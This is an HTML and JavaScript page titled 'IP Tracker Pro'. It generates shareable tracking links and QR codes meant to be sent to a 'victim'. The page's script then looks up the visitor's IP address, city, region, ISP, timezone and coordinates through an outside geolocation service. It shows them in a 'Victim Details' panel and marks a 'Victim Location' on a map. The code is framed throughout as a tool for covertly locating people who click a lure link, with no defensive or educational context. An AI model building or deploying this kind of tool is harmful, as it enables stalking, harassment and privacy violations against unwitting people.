<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔍 IP Tracker - Link Generator</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            color: white;
        }

        .container {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 2rem;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.2);
        }

        h1 {
            text-align: center;
            font-size: 2.2rem;
            margin-bottom: 1rem;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .subtitle {
            text-align: center;
            opacity: 0.9;
            margin-bottom: 2rem;
            font-size: 1.1rem;
        }

        .generate-section {
            text-align: center;
            margin-bottom: 2rem;
        }

        .generate-btn {
            background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 10px 30px rgba(255,107,107,0.4);
        }

        .generate-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(255,107,107,0.6);
        }

        .tracking-link {
            margin-top: 1.5rem;
            padding: 1rem;
            background: rgba(0,0,0,0.3);
            border-radius: 15px;
            word-break: break-all;
            font-family: monospace;
            font-size: 0.95rem;
            display: none;
        }

        .copy-btn {
            background: #4ecdc4;
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 20px;
            margin-left: 10px;
            cursor: pointer;
            font-size: 0.9rem;
        }

        .victim-section {
            background: rgba(0,0,0,0.2);
            border-radius: 15px;
            padding: 1.5rem;
            margin-top: 1.5rem;
            display: none;
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin-top: 1rem;
        }

        .info-card {
            background: rgba(255,255,255,0.1);
            padding: 1rem;
            border-radius: 10px;
            text-align: center;
        }

        .info-label {
            font-size: 0.9rem;
            opacity: 0.8;
            margin-bottom: 0.5rem;
        }

        .info-value {
            font-size: 1.1rem;
            font-weight: bold;
            color: #4ecdc4;
            font-family: monospace;
        }

        .map-container {
            height: 300px;
            border-radius: 15px;
            margin-top: 1rem;
            overflow: hidden;
            display: none;
        }

        #map {
            width: 100%;
            height: 100%;
        }

        .qr-code {
            margin-top: 1rem;
            text-align: center;
        }

        .status {
            padding: 1rem;
            border-radius: 10px;
            margin: 1rem 0;
            font-weight: bold;
            text-align: center;
        }

        .status.success { background: rgba(78,205,196,0.3); }
        .status.error { background: rgba(255,107,107,0.3); }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 IP Tracker Pro</h1>
        <p class="subtitle">Generate tracking link aur victim ki complete details pao!</p>
        
        <div class="generate-section">
            <button id="generateLink" class="generate-btn">🚀 Generate Tracking Link</button>
            <div id="trackingLink" class="tracking-link">
                <div id="linkUrl"></div>
                <button class="copy-btn" onclick="copyLink()">📋 Copy Link</button>
                <div class="qr-code" id="qrCode"></div>
            </div>
        </div>

        <div id="victimInfo" class="victim-section">
            <h3>🎯 Victim Details</h3>
            <div class="status success" id="statusMsg"></div>
            <div class="info-grid" id="infoGrid"></div>
            <div class="map-container" id="mapContainer">
                <div id="map"></div>
            </div>
        </div>
    </div>

    <!-- External Libraries -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>

    <script>
        let currentTrackingId = null;
        let map = null;

        document.getElementById('generateLink').addEventListener('click', generateTrackingLink);

        function generateTrackingId() {
            return 'track_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
        }

        function generateTrackingLink() {
            currentTrackingId = generateTrackingId();
            const baseUrl = window.location.origin;
            const trackingUrl = `${baseUrl}/track.html?id=${currentTrackingId}`;
            
            document.getElementById('linkUrl').textContent = trackingUrl;
            document.getElementById('trackingLink').style.display = 'block';
            
            // Generate QR Code
            QRCode.toCanvas(document.getElementById('qrCode'), trackingUrl, {
                width: 150,
                margin: 2,
                color: {
                    dark: '#000000',
                    light: '#FFFFFF'
                }
            }, function (error) {
                if (error) console.error(error);
            });
        }

        function copyLink() {
            const link = document.getElementById('linkUrl').textContent;
            navigator.clipboard.writeText(link).then(() => {
                showStatus('✅ Link copied to clipboard!', 'success');
            });
        }

        function showStatus(message, type) {
            const status = document.getElementById('statusMsg');
            status.textContent = message;
            status.className = `status ${type}`;
        }

        // Check for tracking ID in URL
        const urlParams = new URLSearchParams(window.location.search);
        const trackingId = urlParams.get('id');
        
        if (trackingId) {
            trackVisitor(trackingId);
        }

        async function trackVisitor(id) {
            try {
                showStatus('📍 Detecting location...', 'success');
                
                const response = await fetch(`https://ipapi.co/json/`);
                const data = await response.json();
                
                // Send to main page (same origin)
                const event = new CustomEvent('locationTracked', { detail: data });
                window.parent.dispatchEvent(event);
                
                // Also store locally
                displayVictimInfo(data, id);
                
            } catch (error) {
                console.error('Error:', error);
                showStatus('❌ Location detection failed', 'error');
            }
        }

        function displayVictimInfo(data, id) {
            document.getElementById('victimInfo').style.display = 'block';
            
            const infoGrid = document.getElementById('infoGrid');
            infoGrid.innerHTML = `
                <div class="info-card">
                    <div class="info-label">IP Address</div>
                    <div class="info-value">${data.ip || 'N/A'}</div>
                </div>
                <div class="info-card">
                    <div class="info-label">City</div>
                    <div class="info-value">${data.city || 'N/A'}</div>
                </div>
                <div class="info-card">
                    <div class="info-label">Region</div>
                    <div class="info-value">${data.region || 'N/A'}</div>
                </div>
                <div class="info-card">
                    <div class="info-label">Country</div>
                    <div class="info-value">${data.country_name || 'N/A'}</div>
                </div>
                <div class="info-card">
                    <div class="info-label">ISP</div>
                    <div class="info-value">${data.org || 'N/A'}</div>
                </div>
                <div class="info-card">
                    <div class="info-label">Timezone</div>
                    <div class="info-value">${data.timezone || 'N/A'}</div>
                </div>
            `;

            // Show map if coordinates available
            if (data.latitude && data.longitude) {
                initMap(data.latitude, data.longitude);
            }
        }

        function initMap(lat, lng) {
            const mapContainer = document.getElementById('mapContainer');
            mapContainer.style.display = 'block';
            
            map = L.map('map').setView([lat, lng], 10);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
            
            L.marker([lat, lng]).addTo(map)
                .bindPopup(`Victim Location<br>Lat: ${lat}<br>Lng: ${lng}`)
                .openPopup();
        }

        // Listen for location data from tracking page
        window.addEventListener('locationTracked', (e) => {
            displayVictimInfo(e.detail, currentTrackingId);
        });
    </script>
</body>
</html>
